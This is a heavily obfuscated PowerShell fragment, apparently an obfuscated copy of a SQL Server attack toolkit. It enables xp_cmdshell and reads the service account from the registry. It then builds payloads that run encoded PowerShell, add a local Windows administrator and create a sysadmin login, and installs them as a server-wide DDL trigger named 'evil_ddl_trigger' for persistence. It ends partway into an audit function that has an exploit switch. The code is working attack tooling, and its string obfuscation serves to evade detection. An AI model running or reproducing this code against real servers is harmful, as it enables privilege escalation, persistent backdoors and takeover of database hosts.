    ${tAb`LeIs`S`ySAD`MIN} = &("{2}{0}{3}{1}"-f 'Obje','t','New-','c') ("{4}{1}{2}{5}{0}{3}"-f 'Tab','ste','m.Data','le','Sy','.Data')
    ${TABleiS`sYsa`dmIn}.("{1}{0}"-f'oad','L').Invoke(${res`ULtS})  

    
    ${t`ABLEi`SSY`S`ADmiN} | &("{0}{3}{2}{1}{4}" -f 'S','Obje','t-','elec','ct') -First 1 ("{2}{1}{0}" -f'tus','ta','syss') | &("{0}{1}" -f 'forea','ch') {

        ${CHEck`SYsAdm`in} = ${_}."S`ys`StAtuS"
        if (${C`h`Eck`s`YSaDMIN} -ne 0){
            &("{2}{3}{1}{0}{4}" -f'V','e-','Wri','t','erbose') ("$Instance "+': '+'Co'+'n'+'firmed '+'Sysad'+'m'+'in '+'acc'+'ess'+'.')                             
        }else{
            &("{2}{1}{0}" -f 'ose','te-Verb','Wri') ("$Instance "+': '+'The'+' '+'c'+'u'+'rrent '+'us'+'er '+'do'+'es '+'n'+'ot '+'ha'+'ve '+'sysad'+'min'+' '+'privile'+'g'+'es.') 
            &("{4}{3}{0}{1}{2}" -f 'e-Ver','bo','se','t','Wri') ("$Instance "+': '+'Sysadm'+'in'+' '+'pri'+'vileg'+'es '+'are'+' '+'requ'+'i'+'red.') 
            Break
        }
    }

    
    ${cO`Nn}.("{1}{0}" -f 'se','Clo').Invoke()

    
    
    
    
    
    &("{1}{2}{0}{3}" -f'e','Wri','te-V','rbose') ("$Instance "+': '+'Enab'+'li'+'ng '+(('nq5'+'Show ')-crEPlACe  ([ChAr]110+[ChAr]113+[ChAr]53),[ChAr]39)+'A'+'dvance'+'d '+('O'+'p'+'tio'+'nsxc7, ')."REPLa`Ce"('xc7',[stRiNG][chAr]39)+'if'+' '+'re'+'qu'+'ired..'+'.')
    
    
    ${C`onn}.("{0}{1}" -f'Op','en').Invoke()

    
    ${Que`RY} = ((("{11}{1}{13}{14}{9}{23}{16}{27}{17}{7}{24}{12}{19}{6}{26}{2}{5}{20}{4}{3}{18}{10}{0}{28}{21}{22}{15}{25}{8}{29}"-f'Show Ad','ect value_in','Y','e Y','_configur','1V)','d Optio','ame = Y','sY1VY1V,','rom','V','IF (sel','van','_us','e f','ti','onfigu','n','1VY1','ce',' = 0
    EXEC (Y1Vsp','anc','ed Op',' sys.c','1VShow Ad','on','ns','rations where ','v','1;RECONFIGUREY1V)'))  -ReplaCE'Y1V',[cHAr]39)

    
    ${C`MD} = &("{2}{0}{1}" -f'-Obje','ct','New') ("{9}{2}{1}{3}{5}{6}{7}{8}{4}{0}" -f'd','ta.SqlC','.Da','lie','n','nt.Sq','lC','om','ma','System')(${qU`ErY},${c`oNN})
    ${r`ESul`Ts} = ${c`Md}.("{3}{0}{1}{2}" -f'ut','e','Reader','Exec').Invoke() 
        
    
    ${c`OnN}.("{1}{0}" -f'e','Clos').Invoke()    
    

    
    
    

    &("{1}{3}{4}{2}{0}"-f 'rbose','Write','e','-','V') ("$Instance "+': '+'Enab'+'li'+'ng '+('{0}xp'+'_cmd'+'s'+'he'+'ll'+'{0}, ')  -F  [chAR]39+'i'+'f '+'r'+'e'+'quir'+'ed...')  
    
    
    ${co`Nn}.("{0}{1}"-f 'Op','en').Invoke()

    
    ${qUe`Ry} = ((("{10}{3}{2}{7}{39}{9}{36}{19}{27}{30}{6}{13}{33}{1}{20}{18}{24}{37}{4}{31}{15}{21}{11}{22}{28}{23}{35}{14}{16}{38}{34}{26}{12}{29}{25}{0}{5}{17}{8}{32}"-f'G','s ','sele',' (','md','URE','ati','ct','0','alu','IF',') =','0}','o','XEC ({0','el','}sp','{','a','om sys.','where n','l{0}',' 0',' ','me =','_cmdshell{0}{0},1;RECONFI','{','con','
  ','xp','figur','sh','})','n','figure {0}',' E','e_in_use fr',' {0}xp_c','_con',' v'))-F [ChaR]39)

    
    ${c`MD} = &("{1}{3}{0}{2}"-f'e','New-','ct','Obj') ("{2}{3}{1}{0}{5}{6}{7}{8}{4}"-f 'SqlCl','.','Sys','tem.Data','nd','ie','nt','.Sq','lComma')(${quE`Ry},${CO`Nn})
    ${r`eSULts} = ${C`Md}.("{1}{0}{2}"-f 'xecuteRe','E','ader').Invoke() 
        
    
    ${co`Nn}.("{0}{1}" -f'Clo','se').Invoke()  


    
    
    
    
    &("{0}{2}{3}{1}" -f'Wr','se','ite','-Verbo') ("$Instance "+': '+'Che'+'cking'+' '+'if'+' '+'s'+'ervic'+'e '+'acc'+'oun'+'t '+'i'+'s '+'a '+'l'+'ocal'+' '+'a'+'d'+'mi'+'nistrat'+'or...')  

    
    ${Co`Nn}.("{0}{1}" -f'Ope','n').Invoke()

    
    ${q`Ue`Ry} = (('{'+'0}

 ')  -f [ChAR]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Setup'+' '+'reg'+' '+'path'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LA'+'RE '+'@SQLSer'+'ver'+'In'+'st'+'ance'+' '+'varch'+'ar(25'+'0) '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'f '+'@@SERV'+'I'+'CENA'+'ME'+' '+'= '+(('Mz'+'PMSS'+'Q'+'LSERVERMz'+'P
 ') -rEpLAcE 'MzP',[cHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'B'+'EGIN	'+'		'+'			'+'					
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@SQLServe'+'rI'+'nsta'+'n'+'ce '+'= '+('{0}'+'S'+'YS'+'TEM{1'+'}C'+'urrentContr'+'ol'+'Set{1}S'+'ervices'+'{1}'+'M'+'SSQ'+'LSE'+'RVER{0}
 ')-f[CHAr]39,[CHAr]92+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END					'+'	
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELS'+'E
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'B'+'EGIN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@S'+'QLServerIn'+'st'+'ance'+' '+'= '+(('LuoSYST'+'EM'+'EdA'+'Current'+'Co'+'ntr'+'ol'+'S'+'etEdASe'+'r'+'v'+'icesEdA'+'MSSQLz'+'5cLuo'+'+ca'+'st('+'@'+'@S'+'ER'+'VICENAM'+'E'+' ')-REPLaCe 'z5c',[CHaR]36  -REPLaCe  'EdA',[CHaR]92-CreplAce'Luo',[CHaR]39)+'a'+'s '+'v'+'a'+'rchar(250))		'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ND

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Gra'+'b '+'s'+'ervi'+'ce '+'a'+'ccount'+' '+'f'+'rom '+(('se'+'rviceG1Rs ')  -cRePlaCE  'G1R',[chaR]39)+'re'+'g '+'pat'+'h
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLAR'+'E'+' '+'@'+'Se'+'rvic'+'eaccountNa'+'me '+'v'+'a'+'rch'+'ar(250) '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EX'+'EC'+'UTE '+'m'+'ast'+'er.d'+'bo.xp_i'+'nst'+'ance_regr'+'ead '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{0'+'}H'+'KEY_LOCA'+'L'+'_'+'M'+'ACHI'+'NE'+'{0}, ')-f [ChAR]39+'@'+'SQLServer'+'I'+'n'+'sta'+'nce, '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{0}Ob'+'jec'+'tN'+'ame{0},@Serv'+'i'+'ceAccount'+'Na'+'m'+'e'+' ')-F [cHar]39+'O'+'UTPUT, '+('N'+'h7bn'+'o'+'_outputh7b ')."Re`PLAcE"(([char]104+[char]55+[char]98),[StRiNG][char]39)+'

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DE'+'C'+'LARE '+'@'+'Machi'+'neType '+' '+'SYSNA'+'ME
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXECU'+'TE'+' '+'m'+'as'+'ter.'+'dbo.xp_reg'+'read'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@ro'+'otke'+'y '+' '+' '+' '+' '+' '+'= '+('N2LVHK'+'EY_'+'L'+'OCAL_MAC'+'HINE'+'2'+'LV,
 ')."r`e`PLace"('2LV',[sTrINg][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@ke'+'y '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+(('N'+'6'+'8'+'H'+'SYSTEMprPCur'+'r'+'en'+'tC'+'ontr'+'olS'+'etpr'+'PC'+'o'+'ntrolprPPro'+'ductOptio'+'ns68H'+',
 ')  -rePlACe'prP',[chAr]92 -CREpLACe  ([chAr]54+[chAr]56+[chAr]72),[chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'value'+'_name '+' '+' '+'= '+('Nmj3Pro'+'ductT'+'ypemj3'+','+' ')."R`EPLace"(([CHar]109+[CHar]106+[CHar]51),[STRing][CHar]39)+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@va'+'l'+'ue '+' '+' '+' '+' '+' '+' '+' '+'= '+'@Machin'+'eTy'+'p'+'e '+'output'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'G'+'rab '+'more'+' '+'info'+' '+'ab'+'out '+'the'+' '+'ser'+'ver'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LEC'+'T '+'@Se'+'rviceAccoun'+'tNa'+'me '+'as'+' '+('Sv'+'cA'+'cc'+'t
{0}')  -f  [cHar]34)

    
    ${c`MD} = &("{0}{2}{1}"-f'New-Obj','t','ec') ("{0}{7}{3}{5}{2}{8}{6}{1}{4}"-f 'System','omma','Clien','ata.','nd','Sql','SqlC','.D','t.')(${QU`E`RY},${co`Nn})
    ${r`esUL`TS} = ${C`Md}.("{0}{2}{3}{1}"-f 'Exec','ader','u','teRe').Invoke() 

    
    ${TaBl`ESeR`VIC`EA`CcOUnT} = &("{3}{1}{2}{0}" -f 'bject','e','w-O','N') ("{1}{2}{3}{0}{4}"-f'taTabl','S','y','stem.Data.Da','e')
    ${TaB`L`eSErvice`AC`c`Ou`Nt}.("{1}{0}"-f 'd','Loa').Invoke(${R`Es`UlTs})  
    ${sQ`L`serVEs`E`RVIcEAcc`o`Un`TdirTy} = ${TA`BlE`SeR`V`ICEaC`c`OUnt} | &("{0}{1}"-f 'se','lect') ("{1}{0}{2}"-f 'v','S','cAcct') -ExpandProperty ("{1}{0}"-f'ct','SvcAc') 
    ${s`qlSE`Rv`E`S`eRvicEAcc`OunT} = ${sqlS`erVES`ervic`e`AcCOUNTDIRty} -replace ((("{2}{0}{1}"-f '1.t','G1tG1','tG')) -CrePLAce  'tG1',[ChAr]92),''
        
    
    ${c`onN}.("{1}{0}" -f 'lose','C').Invoke() 

    
    ${C`Onn}.("{1}{0}"-f'pen','O').Invoke()

    
    ${QU`ErY} = ((("{6}{4}{1}{5}{0}{7}{2}{9}{3}{8}" -f'Adm','roup','at','rsGy','shell Gy3net localg',' ','EXEC master..xp_cmd','inistr','3;','o'))."rEpL`ACe"(([CHar]71+[CHar]121+[CHar]51),[STRiNG][CHar]39))

    
    ${c`Md} = &("{3}{0}{2}{1}"-f'ew-Ob','ct','je','N') ("{5}{6}{0}{1}{2}{4}{3}{7}" -f 'ta.S','qlC','lient','q','.S','Sys','tem.Da','lCommand')(${q`UE`Ry},${cO`NN})
    ${re`SU`lts} = ${c`mD}.("{0}{2}{1}" -f'E','r','xecuteReade').Invoke() 

    
    ${t`ABl`esErvIcE`Ac`COunt`p`Riv} = &("{3}{0}{1}{2}"-f 'w-Obj','ec','t','Ne') ("{3}{4}{0}{5}{2}{1}"-f'Da','e','bl','System.Data','.','taTa')
    ${TABl`E`sERv`IcEA`C`Coun`TpRiV}.("{1}{0}"-f 'ad','Lo').Invoke(${rES`ULtS})  
        
    
    ${C`onn}.("{0}{1}"-f 'Cl','ose').Invoke()  

    if(${sqLSErveservI`ce`Ac`CoUNt} -eq ("{2}{1}{0}" -f 'm','ocalSyste','L') -or ${Ta`Bleser`Vic`ea`C`coUntPR`Iv} -contains "$SqlServeServiceAccount"){
        &("{2}{1}{3}{0}"-f 'rbose','V','Write-','e') ("$Instance "+': '+'The'+' '+'ser'+'vi'+'ce '+'a'+'ccount'+' '+"$SqlServeServiceAccount "+'h'+'as '+'loca'+'l'+' '+'administ'+'r'+'at'+'or '+'p'+'rivileg'+'es.')  
        ${SvcA`D`m`iN} = 1
    }else{
        &("{0}{1}{2}"-f'Write','-Ve','rbose') ("$Instance "+': '+'Th'+'e '+'se'+'r'+'vice '+'ac'+'coun'+'t '+"$SqlServeServiceAccount "+'d'+'oes '+'NO'+'T '+'hav'+'e '+'local'+' '+'adminis'+'tr'+'ator '+'pr'+'ivil'+'ege'+'s.') 
        ${S`VCaD`MIn} = 0 
    }

    
    
    
    ${Qu`ery_PSCoM`m`AnD} = ""
     if(${pS`CoM`mAND}){

        
        &("{2}{1}{0}{3}" -f'r','e','Write-V','bose') ("$Instance "+': '+'Cr'+'e'+'ating '+'encoding'+' '+'Powe'+'rSh'+'ell '+'pay'+'l'+'oa'+'d...') 
        
        
        if(${SV`CAdM`in} -eq 0){
            &("{2}{1}{0}{3}"-f 'V','-','Write','erbose') ("$Instance "+': '+'N'+'ote: '+'Power'+'She'+'ll '+(('w'+'on'+'Fmlt ')-cREPlAce ([ChAR]70+[ChAR]109+[ChAR]108),[ChAR]39)+'be'+' '+'able'+' '+'t'+'o '+'t'+'ake '+'admin'+'i'+'strative'+' '+'ac'+'tions'+' '+'du'+'e '+'to'+' '+'th'+'e '+'se'+'r'+'vice '+'ac'+'cou'+'nt '+'co'+'nf'+'igurati'+'on.') 
        }

        
        

        
        ${c`MDb`ytes} =  ( diR vArIaBlE:YcK26U  ).ValUe::"u`NIc`odE".("{1}{2}{0}"-f'es','Ge','tByt').Invoke(${pS`coMm`And})
        ${ENCO`Ded`CommaND} =   (  CHiLDITEM  VaRIabLE:QmRk ).vALue::"tObASe`64s`TR`ing"(${CmdB`Yt`eS})

        
        If (${Enc`OdEDC`OMm`AnD}."L`EnGTh" -gt 8100)
        {
            &("{2}{1}{0}{3}"-f'e-Verb','rit','W','ose') ("{0}{10}{11}{14}{8}{7}{19}{6}{22}{4}{15}{17}{9}{12}{3}{18}{16}{20}{1}{21}{13}{2}{5}"-f'P','Shell command ','not be ','he ','ad','added.','de',' en','l','o lo','ow','e','ng so t','l ','rShel',' i','o','s to','P','co','wer','wil','d paylo') 
        }else{

            
            ${QUEr`y`_PSC`oMm`And} = ('E'+'XEC '+'mas'+'t'+'e'+'r..'+'xp_cmds'+'hell'+' '+('WMzWMz'+'P'+'owerSh'+'ell ')."reP`la`ce"(([cHAr]87+[cHAr]77+[cHAr]122),[STrInG][cHAr]39)+'-'+'enc '+"$EncodedCommand'';") 

            &("{1}{0}{3}{2}" -f'er','Write-V','e','bos') ("$Instance "+': '+'P'+'ayl'+'oad '+'g'+'en'+'erated'+'.') 
        }
    }else{
        &("{0}{1}{2}"-f'Write-','Ver','bose') ("$Instance "+': '+'N'+'ote: '+'No'+' '+'P'+'ow'+'er'+'Shell '+'wil'+'l '+'b'+'e '+'ex'+'ecute'+'d'+', '+'beca'+'us'+'e '+'the'+' '+'pa'+'ramete'+'rs '+('wer'+'e'+'n{0}t ')  -f [chAr]39+'p'+'rovi'+'ded'+'.') 
    }

    
    
    
    ${QuE`RY`_oSAdDu`s`eR} = ""
    if(${NEW`osu`Ser}){

        
        &("{2}{1}{3}{0}" -f'se','rite-Ve','W','rbo') ("$Instance "+': '+'Cr'+'eatin'+'g '+'p'+'ay'+'load '+'t'+'o '+'a'+'dd '+'O'+'S '+'us'+'er.'+'..') 

        
        if(${sV`Ca`d`Min} -eq 0){

            
            &("{0}{3}{2}{1}"-f'Wr','Verbose','e-','it') ("$Instance "+': '+'The'+' '+'servi'+'ce '+'ac'+'co'+'unt '+'do'+'es '+'n'+'ot '+'ha'+'ve '+'lo'+'cal '+'admin'+'ist'+'rator '+'p'+'riv'+'ileges '+'so'+' '+'no'+' '+'OS'+' '+'a'+'d'+'min '+'ca'+'n '+'b'+'e '+'c'+'reated'+'. '+' '+'Ab'+'orte'+'d.')
            Break
        }else{

            
            ${q`UeR`y_O`SadD`UseR} = ('E'+'XEC '+'mast'+'er.'+'.xp_cmd'+'sh'+'el'+'l '+(('E'+'Z'+'kEZkne'+'t ')-CrepLACE 'EZk',[chAR]39)+'use'+'r '+"$NewOsUser "+"$NewOsPass "+'/add'+' '+'& '+'net'+' '+'l'+'ocal'+'g'+'roup '+'a'+'dmi'+'nist'+'rators'+' '+'/'+'add '+"$NewOsUser'';")

            
            &("{0}{2}{1}" -f 'Wr','se','ite-Verbo') ("$Instance "+': '+'Pa'+'yl'+'oad '+'g'+'enerat'+'ed.') 
        }
    }else{
        &("{3}{0}{2}{1}"-f 'i','rbose','te-Ve','Wr') ("$Instance "+': '+'No'+'te'+': '+'N'+'o '+'OS'+' '+'a'+'dmin '+'w'+'ill '+'b'+'e '+'cr'+'e'+'ated, '+'becau'+'s'+'e '+'th'+'e '+'par'+'ame'+'ters '+('werenC'+'q'+'nt ')."R`epLacE"('Cqn',[sTring][chAr]39)+'prov'+'id'+'ed.') 
    }
    
    
    
    
    ${qUE`Ry_SyS`Ad`MIn} = ""
    if(${NEWs`qLUS`eR}){

        
        &("{2}{1}{0}" -f'ose','e-Verb','Writ') ("$Instance "+': '+'Genera'+'ting'+' '+'pay'+'lo'+'ad '+'t'+'o '+'add'+' '+'sysad'+'min.'+'..') 
        
        
        ${QU`eRy_sY`Sa`d`mIN} = ('I'+'F '+'N'+'OT '+'E'+'XISTS '+'(S'+'ELEC'+'T '+'* '+'F'+'ROM '+'sys'+'.sy'+'slogins'+' '+'W'+'HERE '+'nam'+'e '+'= '+"''$NewSqlUser'')
 "+' '+' '+' '+' '+' '+' '+' '+('exec({0}{'+'0}'+'C'+'RE'+'ATE ')-F[chAr]39+'L'+'OG'+'IN '+"$NewSqlUser "+'WI'+'TH '+'PA'+'SSWORD'+' '+'= '+"''''$NewSqlPass'''';EXEC "+'sp_a'+'ddsr'+'vro'+'l'+'eme'+'mber '+"''''$NewSqlUser'''', "+('{'+'0}{'+'0'+'}{0}{0}sysadmin{0}{0'+'}{0}'+'{0};{0}'+'{0'+'}'+')')  -F [CHar]39)

        
        &("{3}{2}{4}{1}{0}"-f'rbose','-Ve','i','Wr','te') ("$Instance "+': '+'Paylo'+'a'+'d '+'generate'+'d'+'.') 
    }else{
        &("{1}{2}{0}"-f 'te-Verbose','W','ri') ("$Instance "+': '+'Note'+': '+'N'+'o '+'s'+'ysad'+'min '+'wi'+'ll '+'b'+'e '+'cr'+'eated,'+' '+'bec'+'aus'+'e '+'t'+'he '+'param'+'e'+'ter'+'s '+('w'+'erenR'+'56t'+' ')."rE`P`lace"(([char]82+[char]53+[char]54),[StrINg][char]39)+'prov'+'ided'+'.') 
    }

    
    
    
    if((${nEw`sQLu`seR}) -or (${n`EW`OsUsER}) -or (${P`SC`OmmaND})){
        
        &("{1}{2}{0}" -f'-Verbose','Wri','te') ("$Instance "+': '+'Cre'+'ati'+'ng '+'tri'+'gg'+'er...') 

        
        
        

        
        ${C`oNn}.("{1}{0}" -f'en','Op').Invoke()

        
        ${Qu`ErY} = ('IF'+' '+'EX'+'ISTS '+'('+'S'+'ELECT '+'* '+'FROM'+' '+'s'+'ys.ser'+'ver'+'_'+'tr'+'igger'+'s '+'WHE'+'R'+'E '+'name'+' '+'= '+('{'+'0}'+'evil_'+'ddl'+'_t'+'rigger{0})'+' ')  -f[ChAR]39+'
 '+' '+' '+' '+' '+' '+' '+' '+'DR'+'OP '+'TRIG'+'G'+'ER '+'[e'+'vil_ddl_t'+'rigg'+'e'+'r'+'] '+'O'+'N '+'ALL'+' '+'SER'+'VER
'+' '+' '+' '+' '+' '+' '+' '+' '+('exec'+'({0'+'}CR'+'EATE ')  -F [ChAr]39+'Tri'+'gger '+'[e'+'v'+'i'+'l'+'_ddl_t'+'rigger] '+'
 '+' '+' '+' '+' '+' '+' '+' '+'o'+'n '+'ALL'+' '+'Server
'+' '+' '+' '+' '+' '+' '+' '+' '+'For'+' '+'DDL'+'_S'+'ERVER_LEVEL_'+'E'+'VE'+'NTS'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+'A'+'S
 '+' '+' '+' '+' '+' '+' '+' '+"$Query_OsAddUser "+"$Query_SysAdmin "+"$Query_PsCommand')")

        ${c`MD} = &("{2}{0}{1}{3}"-f 'Obj','e','New-','ct') ("{7}{3}{4}{2}{5}{6}{0}{1}{8}" -f 'qlC','omman','lClie','a','ta.Sq','nt','.S','System.D','d')(${QU`ERY},${Co`Nn})
        ${r`eSUl`Ts} = ${c`md}.("{0}{4}{2}{3}{1}" -f'E','Reader','ecu','te','x').Invoke() 
        
        
        ${C`oNN}.("{1}{0}"-f 'ose','Cl').Invoke()

         &("{0}{3}{2}{1}"-f 'Wri','erbose','e-V','t') ("$Instance "+': '+'Th'+'e '+'e'+'vil'+'_ddl_'+'trigger '+'t'+'rigge'+'r '+'h'+'as '+'been'+' '+'ad'+'d'+'ed. '+'I'+'t '+'will'+' '+'r'+'un '+'with'+' '+'any'+' '+'DDL'+' '+'ev'+'ent.') 
    }else{
        &("{2}{3}{1}{0}" -f'se','erbo','Wri','te-V') ("$Instance "+': '+'No'+' '+'o'+'ption'+'s '+'w'+'ere '+'provid'+'ed'+'.') 
    }

    
    
    
    if(${R`eM`Ove}){

        
        &("{1}{0}{3}{2}"-f'rite-V','W','ose','erb') ("$Instance "+': '+'Re'+'mo'+'ving '+'tri'+'gger'+' '+'name'+'d'+' '+'evil_DD'+'L_trig'+'ge'+'r...') 

        
        
        

        
        ${C`Onn}.("{0}{1}"-f'O','pen').Invoke()

        
        ${Q`UE`Ry} = ((("{11}{21}{14}{17}{1}{22}{8}{3}{13}{4}{7}{19}{0}{20}{16}{5}{18}{12}{10}{15}{6}{2}{9}" -f 'OP TRIGGE',' ','SERV','.se','ver_tri','il_ddl_tr','L ','ggers WHERE name = {0}evil_ddl_tri','sys','ER','er] ON','IF','gg','r','S',' AL','v','ELECT','i','gger{0}) 
        DR','R [e',' EXISTS (','* FROM '))-F[cHAr]39)

        ${C`mD} = &("{0}{2}{1}{3}" -f 'New-','bje','O','ct') ("{1}{3}{4}{8}{5}{2}{6}{9}{0}{7}" -f 'C','Sys','ent','tem','.','a.SqlCli','.Sq','ommand','Dat','l')(${q`U`ery},${c`OnN})
        ${R`esULTs} = ${c`mD}.("{3}{2}{0}{1}"-f'ade','r','eRe','Execut').Invoke() 
        
        
        ${Co`NN}.("{0}{1}"-f'Clo','se').Invoke()

        &("{2}{1}{0}{3}" -f '-Verb','ite','Wr','ose') ("$Instance "+': '+'T'+'he '+'evi'+'l_ddl_t'+'r'+'igger '+'tr'+'igger'+' '+'ha'+'s '+'b'+'een '+'be'+'en '+'rem'+'o'+'ved.') 
    }

    &("{1}{3}{2}{0}"-f 'bose','Writ','-Ver','e') ("$Instance "+': '+'A'+'ll '+'d'+'one.')
}













Function iNvoKE-`SQlAud`IT`T`eMPLATe
{
    [CmdletBinding()]
    Param(
        [Parameter(maNdatoRY = ${Fa`l`SE},
                VaLUEFrOMpIpELinebYPRopeRTYname = ${T`RuE},
        HElpmESsagE = {"{2}{7}{6}{4}{3}{1}{8}{5}{0}"-f 'with.','t to a','SQ','omain accoun','d','henticate ','erver or ','L S','ut'})]
        [string]${U`SeR`Name},

        [Parameter(manDAtOry = ${faL`se},
                vALuefROMpIPELINeByPrOPertynAme = ${T`RUe},
        HelpMessAge = {"{0}{9}{7}{6}{8}{2}{11}{12}{3}{13}{5}{4}{1}{10}" -f'S','th','o','ca','wi',' ','n accoun','ai','t passw','QL Server or dom','.','rd to a','uthenti','te'})]
        [string]${P`ASsWo`Rd},

        [Parameter(maNDatoRy = ${F`Al`sE},
                vaLUEFromPIPELineByPROPerTynamE = ${tR`UE},
        HElPmEsSaGE = {"{1}{3}{0}{2}{5}{4}" -f'den','Windows c','ti','re','s.','al'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${c`R`edentIAl} =   (  geT-VARiAblE 0459M2  ).vALUE::"EM`PTy",

        [Parameter(MaNDatorY = ${fA`lSe},
                vALUEfROmpipeLiNEbYpRoPErTYName = ${T`Rue},
        helpMeSsaGe = {"{0}{7}{6}{5}{4}{8}{1}{2}{10}{3}{9}"-f 'SQ','tance',' to con','ctio','r in','rve','Se','L ','s','n to.','ne'})]
        [string]${in`St`ANCE},

        [Parameter(mANDaTORY = ${fA`LSE},
        HElPMeSSaGe = {(("{4}{3}{2}{1}{5}{0}" -f'ng.','h','t',' any','DonVPft output','i'))  -CrePlacE 'VPf',[chaR]39})]
        [string]${NOou`TP`UT},

        [Parameter(maNdaTOry = ${fal`SE},
        hElPmESsage = {"{2}{6}{5}{1}{4}{3}{0}" -f 'ssues.','e','Exp','e i','rabl','it vuln','lo'})]
        [switch]${Exp`L`OiT}
    )

    Begin
    {
        
        ${t`B`LDAtA} = &("{1}{2}{0}"-f 't','N','ew-Objec') -TypeName ("{2}{3}{1}{0}{4}"-f'a.DataT','t','Syst','em.Da','able')
        ${nU`lL} = ${t`B`LdAtA}."c`o`lumNs".("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{3}{1}"-f'omp','rName','C','ute'))
        ${Nu`Ll} = ${tBLda`TA}."C`OL`UMNS".("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f 'I','nstance'))
        ${N`UlL} = ${tblD`A`TA}."Co`l`Umns".("{0}{1}"-f'A','dd').Invoke(("{0}{1}{2}" -f 'Vulne','rabil','ity'))
        ${N`ULl} = ${tBLd`ATa}."ColU`mNS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{0}{2}" -f'o','Descrip','n','ti'))
        ${nU`LL} = ${tbl`DatA}."C`O`LumNS".("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}{3}"-f'diatio','me','Re','n'))
        ${N`ULL} = ${TB`ldATA}."c`oLum`NS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}"-f 'ri','Seve','ty'))
        ${N`UlL} = ${TB`Ld`ATA}."CoL`Um`Ns".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{2}{3}" -f'ul','IsV','ner','able'))
        ${nu`lL} = ${tbl`DAtA}."c`ol`UmNs".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}{3}" -f 'abl','IsExploi','t','e'))
        ${nU`ll} = ${TB`L`Data}."cO`lUm`NS".("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}"-f 'Expl','ed','oit'))
        ${n`UlL} = ${TBlD`A`Ta}."CO`lUm`Ns".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}"-f'd','Exp','loitCm'))
        ${nu`Ll} = ${t`BL`DAta}."cO`lum`Ns".("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}" -f'il','s','Deta'))
        ${Nu`ll} = ${t`BlD`ATA}."cOlU`mNS".("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f 'ence','Refer'))
        ${N`Ull} = ${tbl`DATa}."co`l`UmnS".("{1}{0}" -f 'dd','A').Invoke(("{1}{0}" -f 'r','Autho'))
    }

    Process
    {
        
